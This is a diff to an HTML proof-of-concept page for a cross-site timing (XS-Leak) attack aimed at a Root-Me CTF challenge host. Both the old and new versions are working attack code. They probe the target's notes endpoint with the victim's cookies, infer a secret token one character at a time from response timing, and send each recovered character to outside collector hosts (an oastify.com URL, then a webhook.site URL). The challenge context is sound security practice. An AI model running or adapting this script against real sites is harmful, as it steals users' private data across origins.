@@ -1,147 +1,118 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Document</title>
-    </head>
-    <body>
-        <iframe id="ff" frameborder="0"></iframe>
-    </body>
-    <script>
-        // prettier-ignore
-        const ALPHABET_UPPER = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
-        const ALPHABET_LOWER = ALPHABET_UPPER.map((c) => c.toLowerCase());
-        const NUMBERS = [...Array(10).keys()];
-        const CHAR_LIST = [
-            ...ALPHABET_LOWER,
-            ...ALPHABET_UPPER,
-            ...NUMBERS,
-            "&",
-            "é",
-            '"',
-            "'",
-            "(",
-            "-",
-            "è",
-            "_",
-            "ç",
-            "à",
-            ")",
-            "=",
-            "~",
-            "#",
-            "{",
-            "[",
-            "|",
-            "`",
-            "\\",
-            "^",
-            "@",
-            "]",
-            "}",
-            ",",
-            ";",
-            ":",
-            "!",
-            "?",
-            ".",
-            "/",
-            "§",
-            "^",
-            "¨",
-            "$",
-            "£",
-            "€",
-            "ù",
-            "%",
-            "*",
-            "µ",
-            "°",
-            "¤",
-            "<",
-            ">",
-            "²",
-            "+",
-        ].map(encodeURIComponent);
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XS-Leak PoC</title>
+</head>
+<body>
+  <pre id="log">booting...</pre>
+  <script>
+    (async () => {
+      const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
+      const COLLECTOR = "https://webhook.site/906c1d59-d1d1-45dc-aa4c-3824e9c5baa2";
 
-        let baseUrl =
-            "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+      const qs = new URLSearchParams(location.search);
+      const noteId = Number(qs.get("id") || 1);
+      const chars = qs.get("chars") || "abcdefghijklmnopqrstuvwxyz0123456789_-{}";
+      const maxLen = Number(qs.get("max") || 64);
+      const margin = Number(qs.get("margin") || 1200);
+      const run = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
 
-        const endpoint = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/";
+      const logEl = document.getElementById("log");
 
-        let c = 0;
-        let id = 392;
-        let token = encodeURIComponent("zc4r3_4b0ut_+s4mes1t3_c");
-        let isSearching = true;
+      function ui(line) {
+        logEl.textContent += "\n" + line;
+      }
 
-        const findId = async () => {
-            const loopPromise = () =>
-                new Promise((resolve) => {
-                    const sss = document.createElement("script");
-                    sss.onload = () => {
-                        isSearching = false;
-                        document.body.removeChild(sss);
-                        resolve();
-                    };
-                    sss.onerror = () => {
-                        id += 1;
-                        document.body.removeChild(sss);
-                        resolve();
-                    };
-                    sss.src = baseUrl + id;
-                    document.body.appendChild(sss);
-                });
+      function short(v, n) {
+        return String(v == null ? "" : v).replace(/\s+/g, " ").slice(0, n || 180);
+      }
 
-            while (isSearching) {
-                await loopPromise();
-                if (id % 100 === 0) {
-                    fetch(endpoint + "?passed=" + id);
-                }
-            }
+      function send(ev, msg, extra) {
+        try {
+          const p = new URLSearchParams({
+            run,
+            ev: short(ev, 40),
+            msg: short(msg, 220),
+            data: short(JSON.stringify(extra || {}), 500),
+            t: String(Date.now())
+          });
+          const img = new Image();
+          img.referrerPolicy = "no-referrer";
+          img.src = `${COLLECTOR}?${p.toString()}`;
+        } catch (_) {
+          // ignore
+        }
+      }
 
-            isSearching = true;
-            fetch(endpoint + "?id=" + id);
-            baseUrl = baseUrl + id + "/";
-        };
+      async function log(msg, extra) {
+        ui(msg);
+        send("log", msg, extra);
+      }
 
-        const findToken = async () => {
-            const loopPromise = () =>
-                new Promise((resolve) => {
-                    const start = performance.now();
-                    ff.onload = () => {
-                        const timing = performance.now() - start;
-                        if (
-                            timing < 1000 ||
-                            (token + CHAR_LIST[c]).startsWith("f")
-                        ) {
-                            // not found
-                            c += 1;
-                            if (c === CHAR_LIST.length) {
-                                isSearching = false;
-                            }
-                        } else {
-                            // found
-                            token += CHAR_LIST[c];
-                            c = 0;
-                            fetch(endpoint + "?search=" + token);
-                        }
-                        resolve();
-                    };
-                    ff.src = baseUrl + token + CHAR_LIST[c];
-                });
+      async function probe(prefix) {
+        const url = `${TARGET}/notes/${noteId}/${encodeURIComponent(prefix)}`;
+        const t0 = performance.now();
+        try {
+          await fetch(url, {
+            mode: "no-cors",
+            credentials: "include",
+            cache: "no-store"
+          });
+        } catch (_) {
+          // timing signal only
+        }
+        const dt = performance.now() - t0;
+        send("probe", `${prefix} => ${Math.round(dt)}ms`, { prefix, dt: Math.round(dt) });
+        return dt;
+      }
 
-            while (isSearching) {
-                await loopPromise();
-            }
+      send("boot", "script_loaded", { href: location.href, noteId });
+      await log(`run=${run}`);
+      await log(`note_id=${noteId}`);
 
-            fetch(endpoint + "?done=" + token);
-        };
+      const misses = ["zz_not_found_a", "zz_not_found_b", "zz_not_found_c"];
+      const missTimes = [];
+      for (const m of misses) {
+        missTimes.push(await probe(m));
+      }
+      const baseline = missTimes.reduce((a, b) => a + b, 0) / missTimes.length;
+      const threshold = baseline + margin;
+      await log(`baseline=${Math.round(baseline)}ms threshold=${Math.round(threshold)}ms`, {
+        baseline: Math.round(baseline),
+        threshold: Math.round(threshold),
+        margin
+      });
 
-        const main = async () => {
-            await findId();
-            await findToken();
-        };
-        main();
-    </script>
+      let prefix = "";
+      let foundAny = false;
+
+      for (let i = 0; i < maxLen; i++) {
+        let found = false;
+        for (const c of chars) {
+          const candidate = prefix + c;
+          const dt = await probe(candidate);
+          await log(`try ${candidate} => ${Math.round(dt)}ms`);
+          if (dt > threshold) {
+            prefix = candidate;
+            found = true;
+            foundAny = true;
+            await log(`hit ${prefix}`);
+            send("hit", prefix, { prefix, dt: Math.round(dt) });
+            break;
+          }
+        }
+        if (!found) break;
+      }
+
+      if (!foundAny) {
+        await log("diag:no_slow_response");
+      }
+
+      await log(`final:${prefix}`);
+      send("final", prefix, { final: prefix });
+    })();
+  </script>
+</body>
 </html>
